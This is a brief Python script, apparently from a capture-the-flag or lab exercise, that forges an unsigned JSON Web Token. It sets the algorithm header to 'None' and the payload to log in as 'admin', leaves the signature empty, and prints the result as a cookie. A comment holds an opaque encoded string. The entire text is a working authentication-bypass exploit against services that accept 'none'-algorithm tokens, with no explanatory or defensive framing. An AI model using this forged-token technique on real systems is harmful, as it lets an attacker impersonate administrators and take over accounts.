import base64

header = '{"alg":"None"}'

payload = '{"login":"admin"}'

#MzllNDZmOTcyNmJlZDUyNmJlNThmMWVhNWVmNThmYzQwYWYxODMwZTMxNjQyNTkzZjg5YjBkYTlmMjk4YzBmYw
sign = ''

cookie = base64.standard_b64encode(header)+'.'+base64.standard_b64encode(payload)+'.'+sign

print(cookie)
